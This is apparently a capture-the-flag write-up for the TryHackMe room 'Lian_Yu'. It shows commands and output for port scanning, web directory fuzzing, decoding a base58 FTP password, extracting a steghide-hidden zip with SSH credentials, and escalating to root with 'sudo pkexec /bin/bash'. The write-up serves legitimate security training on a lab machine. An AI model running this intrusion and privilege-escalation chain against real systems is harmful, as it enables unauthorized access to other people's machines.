# Lian_Yu

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
Tags: Web, Linux
Subscription type: Free
Description:
A beginner level security challenge
```

Room link: [https://tryhackme.com/room/lianyu](https://tryhackme.com/room/lianyu)

## Solution

### Deploy the VM and Start the Enumeration

We start by scanning the machine with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ export TARGET_IP=10.65.138.96

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ sudo nmap -sV -sC $TARGET_IP  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-10 10:05 CET
Nmap scan report for 10.65.138.96
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34632/tcp6  status
|   100024  1          34907/udp6  status
|   100024  1          42687/tcp   status
|_  100024  1          48547/udp   status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds
```

We have four services running:

- vsftpd 3.0.2 running on port 21
- OpenSSH 6.7p1 running on port 22
- Apache httpd running on port 80
- Sun RPC running on port 111

### What is the Web Directory you found?

Hint: In numbers

Next, we scan recursively for interesting directories on the web server with `ffuf`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$TARGET_IP/FUZZ -ac -recursion

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.65.138.96/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccessZcDqqLmW       [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 111ms]
#                       [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 111ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 112ms]
#                       [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 113ms]
# on at least 2 different hosts [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 113ms]
#                       [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 114ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 114ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 116ms]
#                       [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 115ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 116ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 116ms]
                        [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 116ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 117ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 119ms]
island                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 116ms]
[INFO] Adding a new job to the queue: http://10.65.138.96/island/FUZZ

                        [Status: 200, Size: 2506, Words: 365, Lines: 60, Duration: 110ms]
[INFO] Starting queued job on target: http://10.65.138.96/island/FUZZ

# directory-list-2.3-medium.txt [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 110ms]
# Copyright 2007 James Fisher [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 110ms]
#                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 110ms]
#                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 110ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 110ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 110ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 110ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 111ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 111ms]
# on at least 2 different hosts [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 111ms]
#                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 111ms]
#                       [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 111ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 111ms]
                        [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 112ms]
2100                    [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 110ms]
[INFO] Adding a new job to the queue: http://10.65.138.96/island/2100/FUZZ

                        [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 111ms]
[INFO] Starting queued job on target: http://10.65.138.96/island/2100/FUZZ

#                       [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 112ms]
#                       [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 112ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 113ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 112ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 113ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 113ms]
# Copyright 2007 James Fisher [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 113ms]
#                       [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 113ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 112ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 112ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 112ms]
#                       [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 112ms]
                        [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 116ms]
# on at least 2 different hosts [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 116ms]
                        [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 111ms]
:: Progress: [220559/220559] :: Job [3/3] :: 355 req/sec :: Duration: [0:10:25] :: Errors: 0 ::
```

So we have found these URLs:

- `/island`
- `island/2100`

Answer: `2100`

### What is the file name you found?

Hint: How would you search a file/directory by extension?

Checking the URLs above with `curl` we find (with some empty lines removes)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ curl -L "http://$TARGET_IP/island"
<!DOCTYPE html>
<html>
<body>
<style>
 
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>

<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->

<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>

</body>
</html>

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ curl -L "http://$TARGET_IP/island/2100"
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>

<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
```

a possible username (`vigilante`) and a hint we should be looking for `.ticket` files.  
So let's do just that

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket -u http://$TARGET_IP/island/2100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.138.96/island/2100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              ticket
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/green_arrow.ticket   (Status: 200) [Size: 71]
Progress: 58687 / 441122 (13.30%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 58728 / 441122 (13.31%)
===============================================================
Finished
===============================================================
```

The content of the `.ticket` file is:

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ curl -L "http://$TARGET_IP/island/2100/green_arrow.ticket"                                                             

This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

This looks like a password.

Answer: `green_arrow.ticket`

### What is the FTP Password?

Hint: Looks like base? `https://gchq.github.io/CyberChef/`

Let's try to connect with the found username (`vigilante`) and the likely password (`RTy8yhBQdscX`)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ ftp vigilante@$TARGET_IP
Connected to 10.65.138.96.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.
```

Nope, the password was incorrect. Could it be encoded?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ echo RTy8yhBQdscX | base64 -d
E<��Pv�                                                                                                                                                                                                             
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ echo RTy8yhBQdscX | base58 -d
!#th3h00d   
```

Yes, it could be base58-encoded.

Use `sudo apt install base58` to install the command if needed. Or use `CyberChef` as suggested in the hint.

Answer: `!#th3h00d`

### What is the file name with SSH password?

Now we can try to connect with the new password (`!#th3h00d`)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ ftp vigilante@$TARGET_IP
Connected to 10.65.138.96.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget Leave_me_alone.png [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||48645|).
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
100% |****************************************************************************************************************************************************************|   499 KiB  177.33 KiB/s    00:00 ETA
226 Transfer complete.
511720 bytes received in 00:02 (170.63 KiB/s)
229 Entering Extended Passive Mode (|||51590|).
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
100% |****************************************************************************************************************************************************************|   537 KiB  219.35 KiB/s    00:00 ETA
226 Transfer complete.
549924 bytes received in 00:02 (209.90 KiB/s)
229 Entering Extended Passive Mode (|||55580|).
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
100% |****************************************************************************************************************************************************************|   186 KiB  209.19 KiB/s    00:00 ETA
226 Transfer complete.
191026 bytes received in 00:01 (186.18 KiB/s)
ftp> quit
221 Goodbye.
```

Success, we found and downloaded three images.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ file aa.jpg Leave_me_alone.png Queen\'s_Gambit.png 
aa.jpg:             JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 1200x1600, components 3
Leave_me_alone.png: data
Queen's_Gambit.png: PNG image data, 1280 x 720, 8-bit/color RGBA, non-interlaced
```

Since we are looking for a file name we should check for files hidden with [steganography](https://en.wikipedia.org/wiki/Steganography).

We don't have a (new) password so let's try passwords in this order:

- nothing / blank password
- the "default" password `password`
- password reuse of previously found password(s)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ steghide info aa.jpg        
"aa.jpg":
  format: jpeg
  capacity: 11.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Blank password / nothing didn't work!

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ steghide info aa.jpg
"aa.jpg":
  format: jpeg
  capacity: 11.0 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "ss.zip":
    size: 596.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

But the password `password` did!

We extract the hidden zip-file

```bash
└─$ steghide extract -sf aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".
```

and check it contents

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ unzip ss.zip       
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado   

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ cat passwd.txt                                            
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

         
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ cat shado      
M3tahuman

```

We have a new password (`M3tahuman`).

Answer: `shado`

### User flag (user.txt)

Now we can try to connect with SSH

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ ssh vigilante@$TARGET_IP                       
The authenticity of host '10.65.138.96 (10.65.138.96)' can't be established.
ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.65.138.96' (ED25519) to the list of known hosts.
vigilante@10.65.138.96's password: 
Permission denied, please try again.
vigilante@10.65.138.96's password: 
```

But we cannot connect with the previous user `vigilante`.

Let's see if we can find a new username via FTP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ ftp vigilante@$TARGET_IP
Connected to 10.65.138.96.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||44526|).
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01  2020 slade
drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante
226 Directory send OK.
ftp> quit
221 Goodbye.
```

The other user on the machine is `slade`. We try that username instead together with the `M3tahuman` password.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Lian_Yu]
└─$ ssh slade@$TARGET_IP
slade@10.65.138.96's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ 
```

And we are in and can start looking for the user flag.

```bash
slade@LianYu:~$ ls -la
total 32
drwx------ 2 slade slade 4096 May  1  2020 .
drwxr-xr-x 4 root  root  4096 May  1  2020 ..
-rw------- 1 slade slade   22 May  1  2020 .bash_history
-rw-r--r-- 1 slade slade  220 May  1  2020 .bash_logout
-rw-r--r-- 1 slade slade 3515 May  1  2020 .bashrc
-r-------- 1 slade slade   77 May  1  2020 .Important
-rw-r--r-- 1 slade slade  675 May  1  2020 .profile
-r-------- 1 slade slade   63 May  1  2020 user.txt
slade@LianYu:~$ cat user.txt
THM{<REDACTED>}
                        --Felicity Smoak

slade@LianYu:~$ 
```

Answer: `THM{<REDACTED>}`

### Root flag (root.txt)

Next, we start looking for ways to escalate our privileges.

First out we check if we can run commands with `sudo`

```bash
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ 
```

We can run `pkexec` and inspiration on how to use it can be found on [GTFOBins](https://gtfobins.github.io/gtfobins/pkexec/)

```bash
slade@LianYu:~$ sudo pkexec /bin/bash
root@LianYu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@LianYu:~# 
```

We are now running as `root` and can finally get the root flag

```bash
root@LianYu:~# cat /root/root.txt
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{<REDACTED>}
                                                                              --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825

root@LianYu:~# 
```

Answer: `THM{<REDACTED>}`

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [ffuf - GitHub](https://github.com/ffuf/ffuf)
- [ffuf - Kali Tools](https://www.kali.org/tools/ffuf/)
- [ftp - Linux manual page](https://linux.die.net/man/1/ftp)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [HTML - Wikipedia](https://en.wikipedia.org/wiki/HTML)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [pkexec - GTFOBins](https://gtfobins.github.io/gtfobins/pkexec/)
- [pkexec - Linux manual page](https://linux.die.net/man/1/pkexec)
- [Steganography - Wikipedia](https://en.wikipedia.org/wiki/Steganography)
- [steghide - Homepage](https://steghide.sourceforge.net/)
- [steghide - Kali Tools](https://www.kali.org/tools/steghide/)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [Sun RPC - Wikipedia](https://en.wikipedia.org/wiki/Sun_RPC)
- [vsftpd - Wikipedia](https://en.wikipedia.org/wiki/Vsftpd)
